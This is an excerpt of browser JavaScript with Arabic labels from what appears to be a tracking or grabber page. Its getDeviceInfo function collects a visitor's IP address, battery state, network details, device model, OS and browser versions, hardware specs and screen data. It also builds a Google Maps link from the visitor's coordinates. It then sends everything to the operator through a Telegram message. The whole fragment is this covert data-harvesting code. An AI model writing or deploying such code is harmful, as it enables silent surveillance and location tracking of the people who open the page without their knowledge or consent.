...
رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
        ...
        async function getDeviceInfo() {
            try {
                ...
                const deviceInfo = {
                    'الدولة': 'جارٍ التحديد...',
                    'المدينة': 'جارٍ التحديد...',
                    'عنوان IP': await getIPAddress() || 'غير معروف',
                    'شحن الهاتف': battery ? `${Math.floor(battery.level * 100)}%` : 'غير معروف',
                    'هل الهاتف يشحن؟': battery ? (battery.charging ? 'نعم' : 'لا') : 'غير معروف',
                    'الشبكة': navigator.connection ? navigator.connection.effectiveType || 'غير معروف' : 'غير معروف',
                    'نوع الاتصال': navigator.connection ? navigator.connection.type || 'غير معروف' : 'غير معروف',
                    'الوقت': time,
                    'اسم الجهاز': navigator.userAgentData ? navigator.userAgentData.model || 'غير معروف' : 'غير معروف',
                    'إصدار الجهاز': navigator.userAgentData ? navigator.userAgentData.platformVersion || 'غير معروف' : 'غير معروف',
                    'نوع الجهاز': navigator.userAgentData ? navigator.userAgentData.mobile ? 'هاتف' : 'كمبيوتر' : 'غير معروف',
                    'الذاكرة (RAM)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                    'الذاكرة الداخلية': 'غير معروف', // لا يمكن الحصول عليها مباشرة من المتصفح
                    'عدد الأنوية': navigator.hardwareConcurrency || 'غير معروف',
                    'لغة النظام': navigator.language || 'غير معروف',
                    'اسم المتصفح': navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)[\/\s][\d.]+/)?.[0] || 'غير معروف',
                    'إصدار المتصفح': navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/)?.[2] || 'غير معروف',
                    'دقة الشاشة': `${window.screen.width}x${window.screen.height}`,
                    'إصدار نظام التشغيل': navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'غير معروف',
                    'وضع الشاشة': window.screen.orientation ? window.screen.orientation.type : 'غير معروف',
                    'عمق الألوان': window.screen.colorDepth ? `${window.screen.colorDepth} بت` : 'غير معروف',
                    'تاريخ آخر تحديث للمتصفح': 'غير معروف', // لا يمكن الحصول عليها مباشرة من المتصفح
                    'بروتوكول الأمان المستخدم': window.location.protocol,
                    'نطاق التردد للاتصال': navigator.connection ? navigator.connection.downlink + ' Mbps' : 'غير معروف',
                ...
                log('معلومات الجهاز:', 'success');
                let telegramMessage = "📱 <b>معلومات الجهاز:</b>\n";
                
                for (const [key, value] of Object.entries(deviceInfo)) {
                    log(`- ${key}: ${value}`);
                    telegramMessage += `- <b>${key}</b>: ${value}\n`;
                }
                
                await sendToTelegram(telegramMessage);
                return deviceInfo;
            } catch (error) {
                log(`خطأ في جمع معلومات الجهاز: ${error}`, 'error');
                return null;
            }
        }
